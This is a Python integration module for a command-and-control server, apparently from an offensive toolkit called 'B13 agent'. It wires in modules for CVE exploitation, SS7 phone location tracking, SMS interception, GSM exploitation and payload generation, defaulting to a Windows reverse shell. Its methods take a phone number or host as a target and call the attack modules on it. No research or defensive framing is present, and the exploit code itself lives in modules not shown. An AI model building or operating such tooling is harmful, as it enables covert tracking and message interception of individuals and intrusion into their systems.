import os
import sys

"""
B13 C2 Integration - Custom C2 server integration
Elite C2 operations with local C2 server

Connects to the real C2 server modules at /home/b13/Desktop/b13 agent/c2server/src
and delegates operations to the actual C2 exploitation implementations.
"""

# Add C2 server paths to Python path
C2_SERVER_PATH = os.path.expanduser("/home/b13/Desktop/b13 agent/c2server")
C2_SERVER_SRC_PATH = os.path.join(C2_SERVER_PATH, "src")
sys.path.insert(0, C2_SERVER_PATH)
sys.path.insert(0, C2_SERVER_SRC_PATH)


class C2Integration:
    """C2 server integration - delegates to real C2 server modules"""

    def __init__(self, c2_server_path: str = None):
        self.c2_server_path = c2_server_path or C2_SERVER_PATH
        self.connection = None
        self._cve_exploit = None
        self._ss7_exploit = None
        self._gsm_exploit = None
        self._sms_interceptor = None
        self._payload_gen = None

    def _ensure_initialized(self):
        """Lazily initialize C2 server modules from src/"""
        if self._cve_exploit is not None:
            return

        from src.exploits.cve_exploitation import CVEExploitation
        from src.exploits.fixed_ss7_exploitation import FixedSS7Exploitation
        from src.exploits.fixed_gsm_exploitation import FixedGSMExploitation
        from src.exploits.advanced_sms_interception import AdvancedSMSInterceptor
        from src.payloads.advanced_payload_generator import AdvancedPayloadGenerator

        self._cve_exploit = CVEExploitation()
        self._ss7_exploit = FixedSS7Exploitation()
        self._gsm_exploit = FixedGSMExploitation()
        self._sms_interceptor = AdvancedSMSInterceptor()
        self._payload_gen = AdvancedPayloadGenerator()

    async def connect(self) -> dict:
        """Connect to C2 server - verifies database and modules"""
        db_path = os.path.join(self.c2_server_path, "c2server.db")
        db_exists = os.path.exists(db_path)

        self._ensure_initialized()

        return {
            "status": "connected",
            "server": self.c2_server_path,
            "database": db_path,
            "database_exists": db_exists,
            "modules": {
                "cve_exploitation": self._cve_exploit is not None,
                "ss7_exploitation": self._ss7_exploit is not None,
                "gsm_exploitation": self._gsm_exploit is not None,
                "sms_interceptor": self._sms_interceptor is not None,
                "payload_generator": self._payload_gen is not None,
            },
        }

    async def track_location(self, target_msisdn: str) -> dict:
        """Track location using SS7 protocol via real C2 server"""
        self._ensure_initialized()
        location_result = await self._ss7_exploit.track_location(target_msisdn)
        return {
            "status": "tracking",
            "target": target_msisdn,
            "result": location_result,
        }

    async def intercept_sms(self, target_msisdn: str) -> dict:
        """Intercept SMS messages via real C2 server SMS interceptor"""
        self._ensure_initialized()
        await self._sms_interceptor.start()
        return {
            "status": "intercepting",
            "target": target_msisdn,
            "interceptor_running": self._sms_interceptor.running,
        }

    async def execute_cve_exploit(self, cve_id: str, target: str) -> dict:
        """Execute CVE exploit against target via real C2 server"""
        self._ensure_initialized()
        exploit_result = await self._cve_exploit.exploit_cve(cve_id, target)
        return {
            "status": "executing",
            "cve": cve_id,
            "target": target,
            "result": exploit_result,
        }

    async def generate_payload(self, platform: str = "windows", payload_type: str = "reverse_shell", **options) -> dict:
        """Generate advanced payload via real C2 server"""
        self._ensure_initialized()
        payload_result = await self._payload_gen.generate_payload(
            platform=platform,
            payload_type=payload_type,
            **options
        )
        return {
            "status": "generating",
            "platform": platform,
            "payload_type": payload_type,
            "result": payload_result,
        }
